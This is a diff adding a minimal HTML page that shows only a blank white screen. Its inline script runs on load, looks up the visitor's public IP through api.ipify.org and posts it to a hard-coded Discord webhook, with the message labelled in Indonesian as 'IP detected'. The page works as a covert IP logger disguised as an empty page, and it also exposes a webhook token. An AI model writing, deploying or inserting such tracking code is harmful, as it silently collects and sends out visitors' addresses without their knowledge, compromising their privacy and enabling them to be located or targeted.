@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <style>body { margin: 0; background: white; }</style>
+</head>
+<body>
+<script>
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => fetch('https://discord.com/api/webhooks/1445117940671320146/8JCvIzLgsXy2xxayCodUXSDFuXLfc7GakeSaS_GbPOLUfniQqFnGl3E4ITo2Jcx3qMgd', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      content: `IP terdeteksi: ||${d.ip}||`
+    })
+  }));
+</script>
+</body>
+</html>
